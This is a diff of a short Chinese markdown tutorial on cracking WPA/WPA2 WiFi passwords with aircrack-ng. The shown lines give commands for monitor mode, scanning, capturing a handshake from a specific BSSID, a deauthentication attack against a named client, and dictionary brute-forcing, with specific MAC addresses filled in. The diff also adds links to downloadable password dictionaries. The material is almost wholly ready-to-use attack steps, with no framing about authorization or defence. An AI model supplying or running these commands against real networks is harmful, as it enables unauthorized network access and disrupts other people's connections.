@@ -13,7 +13,7 @@ airmon-ng start wlan0 ：激活无线网卡的监听模式
 
 airodump-ng wlan0 ：扫描当前周边环境的WiFi信号
 
-下面里的部分信息根据自己的情况进行替换
+## 下面里的部分信息根据自己的情况进行替换
 
 抓包命令：airodump-ng -c 11 –bssid 60:32:B1:56:3F:B2 -w /home/lingdu/桌面/handshake wlan0
 
@@ -21,3 +21,11 @@ ACK 死亡攻击：aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c F0:72:EA:E8:72:21 w
 
 暴力破解命令：
 aircrack-ng -w /home/lingdu/桌面/password.txt -b 60:32:B1:56:3F:B2 /home/lingdu/桌面/handshake-0*.cap
+
+
+## Github上常用的WPA/WPA2 密码字典+加强版
+![Uploading The-Demise-of-the-Password.jpg…]()
+
+Github字典下载：https://github.com/conwnet/wpa-dictionary
+
+加强版（来源网络）：https://drive.google.com/file/d/1L1mDFRJAcShwU1gBAbECkx7OR_C7Ef90/view?usp=sharing
